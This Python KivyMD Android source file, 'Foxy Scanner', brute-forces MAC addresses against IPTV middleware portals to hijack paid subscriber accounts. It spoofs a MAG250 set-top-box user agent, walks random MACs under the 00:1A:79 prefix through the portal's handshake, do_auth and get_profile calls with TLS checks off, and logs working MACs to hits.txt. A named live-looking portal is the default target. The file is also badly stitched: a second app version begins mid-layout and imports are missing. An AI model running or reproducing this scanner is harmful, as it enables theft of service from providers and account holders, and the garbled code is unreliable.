from kivymd.app import MDApp
from kivymd.uix.screen import MDScreen
from kivymd.uix.label import MDLabel

from kivy.lang import Builder
from kivy.clock import Clock
from kivy.properties import StringProperty, NumericProperty

import threading
import requests
import random
import time
import certifi
import os

# SSL fix Android safe
os.environ["SSL_CERT_FILE"] = certifi.where()


# ─────────────────────────────
# SAFE STORAGE
# ─────────────────────────────
try:
    from android.storage import app_storage_path
    STORAGE = app_storage_path()
except:
    STORAGE = os.getcwd()


# ─────────────────────────────
# SCREEN
# ─────────────────────────────
class ScannerScreen(MDScreen):

    total_requests = StringProperty("0")
    success = StringProperty("0")
    errors = StringProperty("0")

    progress = NumericProperty(0)

    running = False
    paused = False

    tested = set()

    # ─────────────────────────
    def on_start(self):
        if self.running:
            return

        self.running = True
        self.paused = False
        self.tested.clear()

        self.log("🚀 Engine Started (PRO Mode)")

        config = self.get_config()

        threading.Thread(
            target=self.engine,
            args=(config,),
            daemon=True
        ).start()

    def on_stop(self):
        self.running = False
        self.paused = False
        self.log("⛔ Engine Stopped")

    # ─────────────────────────
    def get_config(self):
        return {
            "url": "http://example.com",
            "prefix": "00:1A:79",
            "start": 0,
            "end": 50000,
            "timeout": 5
        }

    # ─────────────────────────
    # MAIN ENGINE (OPTIMIZED)
    # ─────────────────────────
    def engine(self, config):

        session = requests.Session()

        try:
            session.get(config["url"], timeout=5, verify=certifi.where())
        except:
            Clock.schedule_once(lambda dt: self.log("❌ Connection Failed"))
            return

        while self.running:

            if self.paused:
                time.sleep(0.2)
                continue

            val = random.randint(config["start"], config["end"])
            mac = f"{config['prefix']}:{val:06X}"

            # SAFE single worker (NO thread explosion)
            self.worker(session, config, mac)

            time.sleep(0.03)

    # ─────────────────────────
    # REQUEST WORKER (SAFE)
    # ─────────────────────────
    def worker(self, session, config, mac):

        try:
            res = session.get(
                config["url"],
                cookies={"mac": mac},
                timeout=config["timeout"],
                verify=certifi.where()
            )

            if "ok" in res.text.lower():
                Clock.schedule_once(lambda dt: self.update(mac, "hit"))
            else:
                Clock.schedule_once(lambda dt: self.update(mac, "miss"))

        except:
            Clock.schedule_once(lambda dt: self.update(mac, "error"))

    # ─────────────────────────
    # SAFE UI UPDATE
    # ─────────────────────────
    def update(self, mac, status):

        self.total_requests = str(int(self.total_requests) + 1)

        if status == "hit":
            self.success = str(int(self.success) + 1)

            path = os.path.join(STORAGE, "hits.txt")
            with open(path, "a") as f:
                f.write(mac + "\n")

            self.log(f"✔ HIT {mac}")

        elif status == "error":
            self.errors = str(int(self.errors) + 1)
            self.log(f"✖ ERROR {mac}")

        self.progress = int(self.total_requests) % 100

    # ─────────────────────────
    def log(self, text):
        print(text)


# ─────────────────────────────
# APP
# ─────────────────────────────
class MyApp(MDApp):

    def build(self):
        self.theme_cls.theme_style = "Dark"

        return ScannerScreen()


if __name__ == "__main__":
    MyApp().run()
                    StatCard:
                        title: "Errors"
                        value: root.error_count
                        accent_color: get_color_from_hex("#FF5252")

                # ── Progress ────────────────────────
                MDCard:
                    orientation: "vertical"
                    padding: dp(12)
                    spacing: dp(6)
                    size_hint_y: None
                    height: dp(72)
                    radius: [10,]
                    elevation: 2
                    md_bg_color: app.theme_cls.bg_dark

                    MDBoxLayout:
                        orientation: "horizontal"
                        size_hint_y: None
                        height: dp(18)

                        MDLabel:
                            text: "Batch Progress"
                            font_style: "Caption"
                            theme_text_color: "Secondary"

                        MDLabel:
                            text: root.progress_text
                            font_style: "Caption"
                            halign: "right"
                            theme_text_color: "Custom"
                            text_color: app.theme_cls.primary_light

                    MDProgressBar:
                        id: batch_progress
                        value: root.progress_value
                        color: app.theme_cls.primary_color

                # ── Configuration ───────────────────
                MDCard:
                    orientation: "vertical"
                    padding: dp(14)
                    spacing: dp(10)
                    size_hint_y: None
                    height: self.minimum_height
                    radius: [10,]
                    elevation: 2
                    md_bg_color: app.theme_cls.bg_dark

                    MDLabel:
                        text: "Configuration"
                        font_style: "Subtitle1"
                        bold: True
                        size_hint_y: None
                        height: dp(26)

                    MDTextField:
                        id: field_url
                        hint_text: "Portal URL"
                        helper_text: "e.g. http://fortv.cc:8080/"
                        helper_text_mode: "on_focus"
                        mode: "rectangle"
                        size_hint_y: None
                        height: dp(56)
                        text: root.endpoint_url
                        on_text: root.endpoint_url = self.text

                    MDTextField:
                        id: field_prefix
                        hint_text: "MAC Prefix"
                        helper_text: "e.g. 00:1A:79"
                        helper_text_mode: "on_focus"
                        mode: "rectangle"
                        size_hint_y: None
                        height: dp(56)
                        text: root.id_prefix
                        on_text: root.id_prefix = self.text

                    MDBoxLayout:
                        orientation: "horizontal"
                        spacing: dp(8)
                        size_hint_y: None
                        height: dp(56)

                        MDTextField:
                            id: field_hex_start
                            hint_text: "Hex Start"
                            helper_text: "e.g. 000000"
                            helper_text_mode: "on_focus"
                            mode: "rectangle"
                            text: root.hex_start
                            on_text: root.hex_start = self.text

                        MDTextField:
                            id: field_hex_end
                            hint_text: "Hex End"
                            helper_text: "e.g. FFFFFF"
                            helper_text_mode: "on_focus"
                            mode: "rectangle"
                            text: root.hex_end
                            on_text: root.hex_end = self.text

                    MDBoxLayout:
                        orientation: "horizontal"
                        spacing: dp(8)
                        size_hint_y: None
                        height: dp(56)

                        MDTextField:
                            id: field_threads
                            hint_text: "Threads"
                            mode: "rectangle"
                            text: root.thread_count
                            on_text: root.thread_count = self.text
                            input_filter: "int"

                        MDTextField:
                            id: field_timeout
                            hint_text: "Timeout (s)"
                            mode: "rectangle"
                            text: root.timeout_val
                            on_text: root.timeout_val = self.text
                            input_filter: "float"

                # ── Terminal Console ────────────────
                MDCard:
                    orientation: "vertical"
                    padding: [dp(8), dp(8)]
                    spacing: dp(4)
                    size_hint_y: None
                    height: dp(260)
                    radius: [10,]
                    elevation: 4
                    md_bg_color: get_color_from_hex("#0D1117")

                    # Title bar
                    MDBoxLayout:
                        orientation: "horizontal"
                        size_hint_y: None
                        height: dp(26)

                    MDBoxLayout:
                        orientation: "horizontal"
                        size_hint_y: None
                        height: dp(28)
                        spacing: dp(8)

                        MDBoxLayout:
                            orientation: "horizontal"
                            spacing: dp(6)
                            size_hint_x: None
                            width: dp(56)
                            padding: [dp(4), 0]

                            MDLabel:
                                text: "●"
                                font_size: dp(14)
                                size_hint_x: None
                                width: dp(14)
                                theme_text_color: "Custom"
                                text_color: get_color_from_hex("#FF5F57")

                            MDLabel:
                                text: "●"
                                font_size: dp(14)
                                size_hint_x: None
                                width: dp(14)
                                theme_text_color: "Custom"
                                text_color: get_color_from_hex("#FFBD2E")

                            MDLabel:
                                text: "●"
                                font_size: dp(14)
                                size_hint_x: None
                                width: dp(14)
                                theme_text_color: "Custom"
                                text_color: get_color_from_hex("#28C840")

                        MDLabel:
                            text: "console — bash"
                            font_style: "Caption"
                            theme_text_color: "Custom"
                            text_color: get_color_from_hex("#8B949E")

                        MDIconButton:
                            icon: "delete-sweep-outline"
                            theme_icon_color: "Custom"
                            icon_color: get_color_from_hex("#8B949E")
                            on_release: root.clear_log()
                            size_hint_x: None
                            width: dp(32)

                    # Log scroll area
                    ScrollView:
                        id: log_scroll
                        do_scroll_x: False
                        bar_color: app.theme_cls.primary_color
                        bar_width: dp(3)

                        MDBoxLayout:
                            id: log_container
                            orientation: "vertical"
                            size_hint_y: None
                            height: self.minimum_height
                            padding: [dp(2), dp(2)]
                            spacing: dp(1)

                # ── Status Row ──────────────────────
                MDBoxLayout:
                    orientation: "horizontal"
                    size_hint_y: None
                    height: dp(32)
                    padding: [dp(4), 0]

                    MDLabel:
                        text: root.status_text
                        font_style: "Caption"
                        theme_text_color: "Custom"
                        text_color: root.status_color
                        size_hint_x: None
                        width: dp(160)

                    MDLabel:
                        text: root.rate_text
                        font_style: "Caption"
                        halign: "right"
                        theme_text_color: "Secondary"

                # ── Control Buttons ─────────────────
                MDBoxLayout:
                    orientation: "horizontal"
                    spacing: dp(8)
                    size_hint_y: None
                    height: dp(52)

                    MDRaisedButton:
                        id: btn_start
                        text: "START"
                        md_bg_color: get_color_from_hex("#00897B")
                        theme_text_color: "Custom"
                        text_color: 1, 1, 1, 1
                        on_release: root.on_start_pressed()

                    MDRaisedButton:
                        id: btn_pause
                        text: "PAUSE"
                        md_bg_color: get_color_from_hex("#E65100")
                        theme_text_color: "Custom"
                        text_color: 1, 1, 1, 1
                        on_release: root.on_pause_pressed()
                        disabled: True

                    MDRaisedButton:
                        id: btn_stop
                        text: "STOP"
                        md_bg_color: get_color_from_hex("#B71C1C")
                        theme_text_color: "Custom"
                        text_color: 1, 1, 1, 1
                        on_release: root.on_stop_pressed()
                        disabled: True


<HistoryScreen>:
    name: "history"

    MDBoxLayout:
        orientation: "vertical"

        MDTopAppBar:
            title: "Session History"
            md_bg_color: app.theme_cls.primary_color
            specific_text_color: 1, 1, 1, 1
            right_action_items:
                [["trash-can-outline", lambda x: root.clear_history()]]

        # Filter buttons row
        MDBoxLayout:
            orientation: "horizontal"
            spacing: dp(6)
            padding: [dp(10), dp(6)]
            size_hint_y: None
            height: dp(48)
            md_bg_color: app.theme_cls.bg_dark

            MDRaisedButton:
                text: "All"
                font_size: dp(11)
                md_bg_color: app.theme_cls.primary_color
                on_release: root.filter_logs("all")

            MDRaisedButton:
                text: "Success"
                font_size: dp(11)
                md_bg_color: get_color_from_hex("#1B5E20")
                on_release: root.filter_logs("success")

            MDRaisedButton:
                text: "Errors"
                font_size: dp(11)
                md_bg_color: get_color_from_hex("#B71C1C")
                on_release: root.filter_logs("error")

            MDRaisedButton:
                text: "Info"
                font_size: dp(11)
                md_bg_color: get_color_from_hex("#1565C0")
                on_release: root.filter_logs("info")

        ScrollView:
            do_scroll_x: False

            MDBoxLayout:
                id: history_container
                orientation: "vertical"
                padding: dp(10)
                spacing: dp(6)
                size_hint_y: None
                height: self.minimum_height
"""

# ─────────────────────────────────────────────
#  Custom Widget Classes
# ─────────────────────────────────────────────

class StatCard(MDCard):
    title       = StringProperty("Stat")
    value       = StringProperty("0")
    accent_color = ListProperty([1, 1, 1, 1])


class LogLine(MDBoxLayout):
    text       = StringProperty("")
    line_color = ListProperty([0.8, 0.8, 0.8, 1])


class HistoryItem(MDCard):
    icon_char  = StringProperty("●")
    hw_id      = StringProperty("")
    detail     = StringProperty("")
    timestamp  = StringProperty("")
    item_color = ListProperty([1, 1, 1, 1])


# ─────────────────────────────────────────────
#  Scanner Screen & Engine Integration
# ─────────────────────────────────────────────

class ScannerScreen(MDScreen):
    total_requests  = StringProperty("0")
    successful_hits = StringProperty("0")
    error_count     = StringProperty("0")
    progress_value  = NumericProperty(0)
    progress_text   = StringProperty("0 / 0  (0%)")

    endpoint_url = StringProperty("http://fortv.cc:8080/")
    id_prefix    = StringProperty("00:1A:79")
    hex_start    = StringProperty("000000")
    hex_end      = StringProperty("FFFFFF")
    thread_count = StringProperty("5")
    timeout_val  = StringProperty("7.0")

    status_text  = StringProperty("● IDLE")
    status_color = ListProperty(get_color_from_hex("#8B949E"))
    rate_text    = StringProperty("Rate: — req/s")

    _is_running  = BooleanProperty(False)
    _is_paused   = BooleanProperty(False)
    _total_int   = 0
    _success_int = 0
    _error_int   = 0
    _batch_size  = 1
    
    _tested_values = set()

    def _get_config(self):
        return {
            "url":       self.ids.field_url.text.strip(),
            "prefix":    self.ids.field_prefix.text.strip(),
            "hex_start": self.ids.field_hex_start.text.strip(),
            "hex_end":   self.ids.field_hex_end.text.strip(),
            "threads":   int(self.ids.field_threads.text or 5),
            "timeout":   float(self.ids.field_timeout.text or 7.0),
        }

    def on_start_pressed(self):
        config = self._get_config()
        self._is_running = True
        self._is_paused  = False
        self._total_int  = 0
        self._success_int = 0
        self._error_int  = 0
        self.total_requests  = "0"
        self.successful_hits = "0"
        self.error_count     = "0"
        self.progress_value  = 0
        self._tested_values.clear()

        self._set_controls(running=True)
        self._set_status("running")

        try:
            s = int(config["hex_start"], 16)
            e = int(config["hex_end"], 16)
            self._batch_size = max(e - s, 1)
        except ValueError:
            self._batch_size = 100000

        self.log("[*] Engine Booted Up Successfully", "info")
        
        # تشغيل دالة الاتصال والمحرك في Thread منفصل لمنع تجميد الواجهة
        threading.Thread(target=self.run_engine, args=(config,), daemon=True).start()

    def on_pause_pressed(self):
        if not self._is_paused:
            self._is_paused = True
            self._set_status("paused")
            self.ids.btn_pause.text = "RESUME"
            self.log("[~] Engine Suspended", "warn")
        else:
            self._is_paused = False
            self._set_status("running")
            self.ids.btn_pause.text = "PAUSE"
            self.log("[~] Engine Resumed", "info")

    def on_stop_pressed(self):
        self._is_running = False
        self._is_paused  = False
        self._set_controls(running=False)
        self._set_status("idle")
        self.ids.btn_pause.text = "PAUSE"
        self.log("─" * 40, "dim")
        self.log(f"[!] Engine Stopped. Total Processed: {self._total_int}", "warn")

    def run_engine(self, config):
        base_url = config["url"]
        portal = f"{base_url if base_url.endswith('/') else base_url + '/'}portal.php"
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250',
            'X-User-Agent': 'model=MAG250;ver=0;features=6',
            'Referer': base_url
        }

        session = requests.Session()
        try:
            self.log("[*] Phase 1: Initiating Handshake...", "info")
            session.get(f"{portal}?type=stb&action=handshake", headers=headers, timeout=config["timeout"], verify=False)
            self.log("[+] Handshake Established. Shared Session Active.", "success")
        except Exception as e:
            Clock.schedule_once(lambda dt: self.log(f"[✗] Handshake Failed: {str(e)}", "error"))
            Clock.schedule_once(lambda dt: self.on_stop_pressed())
            return

        start_hex = int(config["hex_start"], 16)
        end_hex = int(config["hex_end"], 16)

        # محرك خيوط المعالجة المتعددة (Thread Pool) لضمان السرعة العالية وبدون حجز موارد الجهاز
        from concurrent.futures import ThreadPoolExecutor
        with ThreadPoolExecutor(max_workers=config["threads"]) as executor:
            while self._is_running:
                if self._is_paused:
                    time.sleep(0.5)
                    continue
                
                val = random.randint(start_hex, end_hex)
                if val in self._tested_values:
                    continue
                self._tested_values.add(val)

                suffix = hex(val)[2:].upper().zfill(6)
                mac = f"{config['prefix']}:{suffix[0:2]}:{suffix[2:4]}:{suffix[4:6]}"
                
                executor.submit(self.process_triple_request, session, portal, mac, headers, config["timeout"])
                time.sleep(0.05)

    def process_triple_request(self, session, portal, mac, headers, timeout):
        if not self._is_running: return
        try:
            auth_url = f"{portal}?type=itv&action=do_auth"
            res = session.get(auth_url, cookies={'mac': mac}, headers=headers, timeout=timeout, verify=False)
            
            if "token" in res.text.lower() and len(res.text) > 20:
                profile_url = f"{portal}?type=stb&action=get_profile"
                prof = session.get(profile_url, cookies={'mac': mac}, headers=headers, timeout=timeout, verify=False)
                
                if "expiry" in prof.text or "parent_password" in prof.text:
                    Clock.schedule_once(lambda dt: self.handle_ui_update(mac, status="hit"))
                else:
                    Clock.schedule_once(lambda dt: self.handle_ui_update(mac, status="miss"))
            else:
                Clock.schedule_once(lambda dt: self.handle_ui_update(mac, status="miss"))
        except:
            Clock.schedule_once(lambda dt: self.handle_ui_update(mac, status="error"))

    def handle_ui_update(self, mac, status):
        self._total_int += 1
        self.total_requests = str(self._total_int)

        # تحديد مجلد الحفظ المتوافق مع صلاحيات أندرويد
        try:
            from android.storage import primary_external_storage_path
            target_file = os.path.join(primary_external_storage_path(), "hits.txt")
        except:
            target_file = "hits.txt"

        if status == "hit":
            self._success_int += 1
            self.successful_hits = str(self._success_int)
            self.log(f"[+] ✅ HIT: {mac}", "success")
            MDApp.get_running_app().add_history(mac, 200, "Active Profile Found", "success")
            with open(target_file, "a") as f:
                f.write(f"✅ HIT: {mac} | {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        elif status == "error":
            self._error_int += 1
            self.error_count = str(self._error_int)
            self.log(f"[✗] Timeout: {mac}", "error")
            MDApp.get_running_app().add_history(mac, 0, "Timeout", "error")
        else:
            self.log(f"[*] Trying: {mac}", "dim")

        pct = min(int((self._total_int / self._batch_size) * 100), 100)
        self.progress_value = pct
        self.progress_text  = f"{self._total_int} / {self._batch_size}  ({pct}%)"

    # ── Log colors ──────────────────────────────────────────────
    COLOR_MAP = {
        "success": get_color_from_hex("#00E676"),
        "error":   get_color_from_hex("#FF5252"),
        "warn":    get_color_from_hex("#FFD740"),
        "info":    get_color_from_hex("#82AAFF"),
        "dim":     get_color_from_hex("#5D6266"),
    }

    def log(self, text: str, level: str = "info"):
        color = self.COLOR_MAP.get(level, self.COLOR_MAP["info"])
        ts    = datetime.datetime.now().strftime("%H:%M:%S")

        line = LogLine()
        line.text       = f"[color=#3D444D]{ts}[/color]  {text}"
        line.line_color = color

        self.ids.log_container.add_widget(line)
        Clock.schedule_once(lambda dt: setattr(self.ids.log_scroll, "scroll_y", 0), 0.05)

    def clear_log(self):
        self.ids.log_container.clear_widgets()
        self.log("[*] Console cleared", "dim")

    def _set_controls(self, running: bool):
        self.ids.btn_start.disabled = running
        self.ids.btn_pause.disabled = not running
        self.ids.btn_stop.disabled  = not running

    def _set_status(self, state: str):
        states = {
            "idle":    ("● IDLE",    get_color_from_hex("#8B949E")),
            "running": ("▶ RUNNING", get_color_from_hex("#00E676")),
            "paused":  ("|| PAUSED", get_color_from_hex("#FFD740")),
        }
        label, color = states.get(state, states["idle"])
        self.status_text  = label
        self.status_color = color


# ─────────────────────────────────────────────
#  History Screen
# ─────────────────────────────────────────────

class HistoryScreen(MDScreen):
    _all_entries = []
    _filter      = "all"

    def add_entry(self, hw_id, status_code, detail, level):
        ts = datetime.datetime.now().strftime("%H:%M:%S")
        self._all_entries.append({
            "hw_id": hw_id, "code": status_code,
            "detail": detail, "level": level, "time": ts
        })
        if self._filter in ("all", level):
            self._render(hw_id, status_code, detail, level, ts)

    ICONS = {
        "success": ("✔", get_color_from_hex("#00E676")),
        "error":   ("✘", get_color_from_hex("#FF5252")),
        "info":    ("i", get_color_from_hex("#82AAFF")),
    }

    def _render(self, hw_id, code, detail, level, ts):
        icon, color = self.ICONS.get(level, ("●", [1, 1, 1, 1]))
        item = HistoryItem()
        item.icon_char  = icon
        item.hw_id      = hw_id
        item.detail     = f"Status: {detail}"
        item.timestamp  = ts
        item.item_color = color
        self.ids.history_container.add_widget(item)

    def filter_logs(self, level: str):
        self._filter = level
        self.ids.history_container.clear_widgets()
        for e in self._all_entries:
            if level == "all" or e["level"] == level:
                self._render(e["hw_id"], e["code"], e["detail"], e["level"], e["time"])

    def clear_history(self):
        self._all_entries.clear()
        self.ids.history_container.clear_widgets()


# ─────────────────────────────────────────────
#  App Entry
# ─────────────────────────────────────────────

class APITesterApp(MDApp):

    def build(self):
        self.theme_cls.primary_palette = "Teal"
        self.theme_cls.accent_palette  = "Cyan"
        self.theme_cls.theme_style     = "Dark"

        Builder.load_string(KV)

        self.scanner = ScannerScreen()
        self.history = HistoryScreen()

        nav = MDBottomNavigation()

        tab1 = MDBottomNavigationItem(name="scanner", text="Scanner", icon="radar")
        tab1.add_widget(self.scanner)

        tab2 = MDBottomNavigationItem(name="history", text="History", icon="history")
        tab2.add_widget(self.history)

        nav.add_widget(tab1)
        nav.add_widget(tab2)

        Clock.schedule_once(self._boot_log, 0.4)
        return nav

    def _boot_log(self, dt):
        s = self.scanner
        s.log("[*] Foxy Scanner V4 UI Core Loaded", "info")
        s.log("[*] KivyMD 1.2.0 production build active", "info")
        s.log("─" * 40, "dim")

    def add_history(self, hw_id, code, detail, level):
        self.history.add_entry(hw_id, code, detail, level)

    def show_info(self):
        Snackbar(text="Foxy Scanner Pro V4 — Production Edition").open()


if __name__ == "__main__":
    APITesterApp().run()
